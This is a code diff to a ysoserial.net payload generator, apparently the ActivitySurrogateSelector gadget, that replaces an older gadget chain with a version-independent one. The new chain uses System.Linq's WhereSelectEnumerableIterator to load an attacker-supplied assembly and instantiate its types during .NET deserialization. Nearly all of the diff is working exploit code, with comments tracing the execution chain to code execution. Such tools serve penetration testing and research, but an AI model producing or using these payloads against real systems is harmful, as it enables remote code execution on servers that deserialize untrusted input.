@@ -35,17 +35,28 @@ namespace ysoserial.Generators
         protected byte[] assemblyBytes;
         public PayloadClass()
         {
-            this.assemblyBytes = File.ReadAllBytes(typeof(E).Assembly.Location);
+            this.assemblyBytes = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "e.dll"));
         }
 
         protected PayloadClass(SerializationInfo info, StreamingContext context)
         {
         }
-
+        private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
+        {
+            Type t = Assembly.Load("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
+              .GetType("System.Linq.Enumerable+WhereSelectEnumerableIterator`2")
+              .MakeGenericType(typeof(TSource), typeof(TResult));
+            return t.GetConstructors()[0].Invoke(new object[] { src, predicate, selector }) as IEnumerable<TResult>;
+        }
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
             System.Diagnostics.Trace.WriteLine("In GetObjectData");
 
+            //Old technique contains a compiler-generated class [System.Core]System.Linq.Enumerable+<SelectManyIterator>d__[Compiler_Generated_Class_SEQ]`2,
+            //the Compiler_Generated_Class_SEQ may NOT same in different version of .net framework. 
+            //For example, in .net framework 4.6 was 16,and 17 in .net framework 4.7.
+
+            /*
             // Build a chain to map a byte array to creating an instance of a class.
             // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
             List<byte[]> data = new List<byte[]>();
@@ -54,9 +65,50 @@ namespace ysoserial.Generators
             Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
             var e2 = e1.SelectMany(map_type);
             var e3 = e2.Select(Activator.CreateInstance);
+            */
 
+            //New technique use [System.Core]System.Linq.Enumerable+WhereSelectEnumerableIterator`2 only to fix it.
+            //It make compatible from v3.5 to lastest(needs to using v3.5 compiler, and may also need to call disable type check first if target runtime was v4.8+).
+            //Execution chain: Assembly.Load(byte[]).GetTypes().GetEnumerator().{MoveNext(),get_Current()} -> Activator.CreateInstance() -> Win!
+            byte[][] e1 = new byte[][] { assemblyBytes };
+            IEnumerable<Assembly> e2 = CreateWhereSelectEnumerableIterator<byte[], Assembly>(e1, null, Assembly.Load);
+            IEnumerable<IEnumerable<Type>> e3 = CreateWhereSelectEnumerableIterator<Assembly, IEnumerable<Type>>(e2,
+                null,
+                (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
+                    (
+                        typeof(Func<Assembly, IEnumerable<Type>>),
+                        typeof(Assembly).GetMethod("GetTypes")
+                    )
+            );
+            IEnumerable<IEnumerator<Type>> e4 = CreateWhereSelectEnumerableIterator<IEnumerable<Type>, IEnumerator<Type>>(e3,
+                null,
+                (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
+                (
+                    typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
+                    typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
+                )
+            );
+            //bool MoveNext(this) => Func<IEnumerator<Type>,bool> => predicate
+            //Type get_Current(this) => Func<IEnumerator<Type>,Type> => selector
+            //
+            //WhereSelectEnumerableIterator`2.MoveNext => 
+            //  if(predicate(IEnumerator<Type>)) {selector(IEnumerator<Type>);} =>
+            //  IEnumerator<Type>.MoveNext();return IEnumerator<Type>.Current;
+            IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
+                (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
+                (
+                    typeof(Func<IEnumerator<Type>, bool>),
+                    typeof(IEnumerator).GetMethod("MoveNext")
+                ),
+                (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
+                (
+                    typeof(Func<IEnumerator<Type>, Type>),
+                    typeof(IEnumerator<Type>).GetProperty("Current").GetGetMethod()
+                )
+            );
+            IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
             // PagedDataSource maps an arbitrary IEnumerable to an ICollection
-            PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
+            PagedDataSource pds = new PagedDataSource() { DataSource = end };
             // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
             // Class is internal so need to use reflection.
             IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
@@ -71,6 +123,9 @@ namespace ysoserial.Generators
             ls.Add(e1);
             ls.Add(e2);
             ls.Add(e3);
+            ls.Add(e4);
+            ls.Add(e5);
+            ls.Add(end);
             ls.Add(pds);
             ls.Add(verb);
             ls.Add(dict);
@@ -144,7 +199,7 @@ namespace ysoserial.Generators
 
         public override string Finders()
         {
-            return "James Forshaw";
+            return "James Forshaw,fixed by zcgonvh";
         }
 
         public override List<string> Labels()
